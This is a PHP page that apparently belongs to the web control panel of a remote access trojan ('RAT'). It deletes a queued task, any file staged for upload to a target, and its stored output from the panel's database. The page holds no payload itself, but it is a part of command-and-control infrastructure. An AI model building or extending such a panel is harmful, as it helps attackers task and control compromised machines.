<?php
  # Necessary at the top of every page for session management
  session_start();

  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: 403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));

    $id = $_GET["id"]; # Task ID to be deleted

    # Gets action from "tasks" table
    $statement = $dbConnection->prepare("SELECT action, secondary FROM tasks WHERE id = :id");
    $statement->bindValue(":id", $id);
    $statement->execute();
    $results = $statement->fetch();

    # If the task was a file upload, we need to delete the tasked uploaded file
    if ($results["action"] == "upload")
    {
      # Deletes tasked upload file
      unlink("/var/www/html" . $results["secondary"]);
    }
    
    # Deletes task from "tasks" table
    $statement = $dbConnection->prepare("DELETE FROM tasks WHERE id = :id");
    $statement->bindValue(":id", $id);
    $statement->execute();

    # Deletes task from "output" table
    $statement = $dbConnection->prepare("DELETE FROM output WHERE id = :id");
    $statement->bindValue(":id", $id);
    $statement->execute();

    # Kills database connection
    $statement->connection = null;

    # Redirects the user back to tasks.php
    header("Location: tasks.php");
  }
?>
